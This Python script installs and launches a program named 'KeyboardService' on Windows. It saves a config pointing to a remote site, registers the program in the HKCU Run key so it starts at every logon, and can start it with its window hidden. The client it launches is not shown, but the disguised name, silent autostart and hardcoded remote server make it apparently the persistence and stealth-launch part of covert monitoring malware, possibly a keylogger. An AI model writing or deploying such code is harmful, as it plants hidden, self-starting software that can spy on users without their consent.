import json
import os
import subprocess
import sys

import winreg

STARTUP_ENTRY_NAME = "KeyboardService"


def get_target_executable():
    if getattr(sys, "frozen", False):
        return os.path.abspath(sys.executable)

    repo_root = os.path.dirname(os.path.abspath(__file__))
    dist_exe = os.path.join(repo_root, "dist", "KeyboardService.exe")
    if os.path.exists(dist_exe):
        return dist_exe

    return os.path.abspath(sys.executable)


def get_startup_command(site_url: str | None = None):
    exe_path = get_target_executable()
    target_url = (site_url or os.getenv("SITE_URL") or "https://pissoff.onrender.com").strip()
    if not getattr(sys, "frozen", False) and not exe_path.lower().endswith(".exe"):
        client_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "client.py")
        return f'"{exe_path}" "{client_path}" --site-url {target_url}'
    return f'"{exe_path}" --site-url {target_url}'


def write_config_file(site_url: str):
    install_dir = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
    os.makedirs(install_dir, exist_ok=True)
    config_path = os.path.join(install_dir, "config.json")
    with open(config_path, "w", encoding="utf-8") as config_file:
        json.dump({"site_url": site_url.strip().rstrip("/")}, config_file, indent=2)
    print(f"Config updated: {config_path}")


def register_startup_launch():
    command = get_startup_command()
    with winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE,
    ) as startup_key:
        winreg.SetValueEx(startup_key, STARTUP_ENTRY_NAME, 0, winreg.REG_SZ, command)
    print(f"Startup entry registered: {command}")


def remove_startup_launch():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS,
        ) as startup_key:
            try:
                winreg.DeleteValue(startup_key, STARTUP_ENTRY_NAME)
                print(f"Removed startup entry: {STARTUP_ENTRY_NAME}")
            except FileNotFoundError:
                print(f"Startup entry not found: {STARTUP_ENTRY_NAME}")
    except FileNotFoundError:
        print(f"Run key not found: {STARTUP_ENTRY_NAME}")


def start_hidden_instance():
    command = get_startup_command()
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    subprocess.Popen(command, shell=True, close_fds=True, startupinfo=startupinfo)
    print(f"Started hidden instance: {command}")


def main():
    if len(sys.argv) > 1 and sys.argv[1].lower() == "install":
        site_url = os.getenv("SITE_URL", "https://pissoff.onrender.com").strip().rstrip("/")
        write_config_file(site_url)
        register_startup_launch()
        return

    if len(sys.argv) > 1 and sys.argv[1].lower() == "remove":
        remove_startup_launch()
        return

    if len(sys.argv) > 1 and sys.argv[1].lower() == "start":
        start_hidden_instance()
        return

    print("Usage: service_client.py [install|remove|start]")


if __name__ == "__main__":
    main()
